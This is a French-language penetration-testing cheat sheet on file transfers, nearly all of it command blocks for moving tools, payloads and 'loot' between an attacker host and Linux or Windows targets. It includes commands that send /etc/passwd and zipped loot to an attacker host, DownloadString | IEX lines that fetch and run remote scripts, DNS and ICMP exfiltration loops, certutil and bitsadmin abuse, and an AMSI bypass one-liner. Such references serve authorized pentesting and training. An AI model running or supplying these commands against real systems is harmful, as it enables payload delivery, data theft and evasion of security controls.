# 07 — File Transfers

## Objectifs
Transférer des fichiers (outils, payloads, loot) dans les deux sens, sur Linux et Windows, avec ou sans binaires natifs, à travers filtres et pare-feux.

---

## 1. Serveurs côté attaquant

```bash
# HTTP
python3 -m http.server 8000
python3 -m http.server 8000 --directory /srv/tools
php -S 0.0.0.0:8000
ruby -run -e httpd . -p 8000
busybox httpd -f -p 8000

# FTP
python3 -m pyftpdlib -p 21 -w
ftp-server / 21   # impacket

# SMB
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -username user -password pass

# Serveur TFTP
sudo atftpd --daemon --port 69 /srv/tftp

# Netcat
nc -lvnp 8000 < file
```

---

## 2. Linux — télécharger

```bash
wget http://<LHOST>:8000/file
wget -q http://<LHOST>:8000/file -O /tmp/file
curl -O http://<LHOST>:8000/file
curl -o /tmp/file http://<LHOST>:8000/file
curl -k https://<LHOST>:8443/file          # TLS auto-signé
scp <USER>@<LHOST>:/path/file .
rsync -av <USER>@<LHOST>:/path/ .

# Sans wget/curl
python3 -c "import urllib.request;urllib.request.urlretrieve('http://<LHOST>:8000/file','/tmp/file')"
python2 -c "import urllib;urllib.urlretrieve('http://<LHOST>:8000/file','/tmp/file')"

# Bash /dev/tcp
exec 3<>/dev/tcp/<LHOST>/8000
echo -e "GET /file HTTP/1.0\r\n\r\n" >&3
cat <&3 > file

# nc
nc <LHOST> 8000 > file
```

### Upload depuis Linux
```bash
curl -X POST http://<LHOST>:8000/upload -F "file=@/etc/passwd"
python3 -c "import requests;requests.post('http://<LHOST>:8000/upload',files={'f':open('/etc/passwd','rb')})"
nc <LHOST> 8000 < file
```

---

## 3. Windows — télécharger

```powershell
# PowerShell
Invoke-WebRequest http://<LHOST>:8000/file -OutFile C:\Temp\file
IWR -Uri http://<LHOST>:8000/file -OutFile C:\Temp\file
(New-Object Net.WebClient).DownloadFile('http://<LHOST>:8000/file','C:\Temp\file')
(New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/script.ps1') | IEX
Start-BitsTransfer -Source http://<LHOST>:8000/file -Destination C:\Temp\file
```

```cmd
:: certutil
certutil -urlcache -split -f http://<LHOST>:8000/file C:\Temp\file
certutil.exe -verifyctl -split -f http://<LHOST>:8000/file

:: bitsadmin
bitsadmin /transfer job http://<LHOST>:8000/file C:\Temp\file

:: Native
curl.exe -o C:\Temp\file http://<LHOST>:8000/file
```

```cmd
:: SMB
copy \\<LHOST>\share\file C:\Temp\file
net use \\<LHOST>\share /user:user pass
```

### LOLBAS / living off the land
```cmd
esentutl /p:file /d:C:\Temp\file
expand file.cab -F:* C:\Temp
makecab file
replace \\<LHOST>\share\file C:\Temp
```

```powershell
# PowerShell sans IEX (script block)
$s = (New-Object Net.WebClient).DownloadString('http://<LHOST>/p.ps1')
[ScriptBlock]::Create($s).Invoke()

# Base64 (contourne certaines restrictions)
$b = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://<LHOST>/b64'))
[IO.File]::WriteAllBytes('C:\Temp\file',$b)
```

---

## 4. Upload depuis Windows

```powershell
# HTTP POST
Invoke-WebRequest -Uri http://<LHOST>:8000/upload -Method POST -InFile C:\Temp\loot.zip
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\loot.zip')); IWR -Uri http://<LHOST>:8000 -Method POST -Body $b64 -ContentType text/plain

# FTP
(New-Object Net.WebClient).UploadFile('ftp://<LHOST>/loot.zip','C:\Temp\loot.zip')
```

```cmd
:: SMB
copy C:\Temp\loot.zip \\<LHOST>\share\
```

```bash
# Attaquant : réception
nc -lvnp 8000 > loot.zip
python3 -m uploadserver 8000        # pip install uploadserver
```

---

## 5. Transferts avec shells

```bash
# netcat (pas de chiffrement)
# attaquant
nc -lvnp 9000 > received
# cible
nc <LHOST> 9000 < file

# socat (chiffré possible)
# attaquant
socat -d -d OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork STDOUT > loot
# cible
socat OPENSSL:vhOST:443,verify=0 FILE:file

# base64 (petits fichiers, contourne les filtres)
# cible
base64 file -w 0
# attaquant
echo '<BASE64>' | base64 -d > file
```

### Exfil via DNS
```bash
# Cible (fragments encodés en sous-domaines)
xxd -p file | fold -w 30 | while read l; do dig +short $l.<DOMAIN>; done
# Attaquant : autorité DNS / tcpdump
sudo tcpdump -i tun0 port 53 -A
```

### Exfil via ICMP
```bash
# Cible
xxd -p file | fold -w 32 | while read l; do ping -c1 -p $l <LHOST>; done
# Attaquant
sudo tcpdump -i tun0 icmp -X
```

---

## 6. Copier via RDP / WinRM / SSH

```bash
# RDP drive redirection
xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /drive:share,/srv/tools
# Puis dans Windows : \\tsclient\share\

# WinRM
evil-winrm -i <TARGET> -u <USER> -p <PASS>
# upload local_file C:\Temp\file
# download C:\Temp\file local_file

# SSH
scp file <USER>@<TARGET>:/tmp/
sftp <USER>@<TARGET>
```

```powershell
# PowerShell Remoting
Copy-Item -ToSession $s C:\Temp\file -Destination /tmp/   # vers Linux non supporté nativement
Invoke-Command -Session $s -ScriptBlock { ... }
```

---

## 7. Contournement de restrictions

```bash
# Pas de wget/curl : /dev/tcp, python, php, perl, ruby, awk
php -r '$f=file_get_contents("http://<LHOST>/f");file_put_contents("/tmp/f",$f);'
perl -e 'use LWP::Simple;getstore("http://<LHOST>/f","/tmp/f");'
ruby -e 'require "open-uri";IO.copy_stream(URI.open("http://<LHOST>/f"),"/tmp/f")'
awk 'BEGIN{while((getline line < "/dev/tcp/<LHOST>/8000")>0) print line}'

# PowerShell en mode restreint (-ExecutionPolicy Bypass)
powershell -ep bypass -c "IEX(...)"
# Contourner AMSI (lab uniquement)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### GTFOBins téléchargement
```bash
# Si un binaire autorisé peut lire une URL
GTFOBins → "File download" / "File upload"
# ex: apt, lua, git, tar, zip, node, npm
```

---

## 8. Vérification d'intégrité

```bash
# Attaquant
sha256sum file
# Cible Linux
sha256sum file
# Windows
certutil -hashfile C:\Temp\file SHA256
Get-FileHash C:\Temp\file -Algorithm SHA256
```

---

## Checklist
- [ ] Serveur de transfert démarré et accessible
- [ ] Méthode native identifiée (curl/wget/iwr/certutil)
- [ ] Binaire uploadé et exécutable (`chmod +x`)
- [ ] Intégrité vérifiée (hash)
- [ ] Nettoyage des fichiers temporaires en fin de mission

## Tableau récapitulatif
| Contexte | Méthode |
|---|---|
| Linux avec curl | `curl -O http://LHOST/f` |
| Linux sans curl | `/dev/tcp`, python, php |
| Windows PowerShell | `IWR`, `WebClient`, `BITS` |
| Windows cmd | `certutil`, `bitsadmin`, `curl.exe` |
| Upload Windows | `Invoke-WebRequest -InFile`, SMB |
| Exfil furtive | DNS, ICMP, HTTPS |
